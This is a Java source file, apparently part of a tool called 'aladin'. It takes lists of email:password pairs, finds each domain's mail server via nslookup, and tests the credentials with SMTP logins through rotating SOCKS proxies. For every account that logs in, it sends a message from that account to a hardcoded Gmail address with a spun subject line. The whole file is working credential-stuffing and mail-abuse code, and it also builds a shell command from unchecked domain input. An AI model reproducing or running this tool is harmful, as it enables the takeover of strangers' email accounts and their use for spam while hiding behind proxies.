package com.bsend.aladin.core;


import com.bsend.aladin.utils.ContentSpinner;
import jakarta.mail.*;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeBodyPart;
import jakarta.mail.internet.MimeMessage;
import jakarta.mail.internet.MimeMultipart;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Properties;
import java.util.UUID;
import java.util.concurrent.*;

public class TaskExecutor {
    private String[] lines;
    private ExecutorService executor;
    private String port;
    private String text;
    private String subject;
    private int awaitingTime;
    private ConcurrentLinkedDeque<String> deque;

    public TaskExecutor(String[] lines, String port, String text, String subject, int threads, ConcurrentLinkedDeque proxy) {
        this.lines = lines;
        this.executor = Executors.newFixedThreadPool(threads);
        this.port = port;
        this.text = text;
        this.subject = subject;
        this.awaitingTime = lines.length * 5;
        this.deque = proxy;
    }

    public void run() {
        System.out.println(port);
        for (String line : lines) {
            Future<Boolean> future = executor.submit(() -> {
                String[] credentials = line.split(":");
                String email = credentials[0];
                String password = credentials[1];
                String smtp = getSmptByDomain(email.split("@")[1]);
                checkCredentials(smtp, email, password);

                return true;
            });
        }
        executor.shutdown();

        try {
            executor.awaitTermination(awaitingTime, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private void sender(Transport transport, Session session, String proxy) throws MessagingException {
        ContentSpinner spinnerSubject = new ContentSpinner(subject, true);
        ContentSpinner spinnerText = new ContentSpinner(text, true);
        try {
            transport.send(createEmail(session, spinnerSubject.generate()));
        } catch (MessagingException e) {
            System.out.println(e.getMessage());
        } finally {
            transport.close();
            if(!proxy.isEmpty()){
                deque.add(proxy);
            }
        }

    }


    public MimeMessage createEmail(Session session, String subject) throws MessagingException {
        MimeMessage mimeMessage = new MimeMessage(session);

        mimeMessage.setRecipient(Message.RecipientType.TO, new InternetAddress("vadetcka@gmail.com"));

        mimeMessage.setSubject(subject, "UTF-8");
        // Создаем multipart с двумя body parts
        MimeMultipart multipart = new MimeMultipart("alternative");

        // Текстовая часть
        MimeBodyPart textPart = new MimeBodyPart();
        textPart.setText("Привет", "UTF-8");
        multipart.addBodyPart(textPart);

        // Установка multipart в качестве содержимого письма
        mimeMessage.setContent(multipart);

        return mimeMessage;
    }

private Transport checkCredentials(String smtp, String email, String password) throws MessagingException {
    Properties props = new Properties();
    props.put("mail.transport.protocol", "smtp");
    props.put("mail.smtp.host", smtp);
    props.put("mail.smtp.port", port);
    props.put("mail.smtp.auth", "true");
    props.put("mail.smtp.timeout", 3000);
    String proxy = "";
    if(!deque.isEmpty()){
        proxy = deque.getFirst();
        deque.removeFirst();
        String[] cred = proxy.split(":");
        props.put("mail.smtp.socks.host", cred[0]);
        props.put("mail.smtp.socks.port", cred[1]);
    }
    if (port.equals("465")) {
        props.put("mail.smtp.ssl.enable", "true");
    } else {
        props.put("mail.smtp.starttls.enable", "true");
    }
    Authenticator authenticator = new Authenticator() {
        @Override
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(email, password);
        }
    };

    Session session = Session.getInstance(props, authenticator);
    //session.setDebug(true);
    Transport transport = session.getTransport();

    try {
        transport.connect();
        sender(transport, session, proxy);
        System.out.println("Авторизация успешна" + ". (" + email + ") - " + smtp);
        return transport; // Возвращаем true, если авторизация прошла успешно
    } catch (MessagingException e) {
        if(!proxy.isEmpty()){
            deque.add(proxy);
        }
        //System.out.println("Авторизация не успешна " + e.getMessage() + ". (" + email + ") - " + smtp);
        return null;
    } finally {
        transport.close();
    }
}

private String getSmptByDomain(String domain) {
    String s = null;
    try {
        Process p = Runtime.getRuntime().exec("nslookup -type=mx " + domain);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));

        while ((s = stdInput.readLine()) != null) {
            if (s.contains("mail exchanger = ")) {
                String smpt = s.split("mail exchanger = ")[1];
                return smpt;
            }
        }
        return null;
    } catch (IOException e) {
        System.out.println("exception happened - here's what I know: ");
        e.printStackTrace();
    }
    return null;
}

}
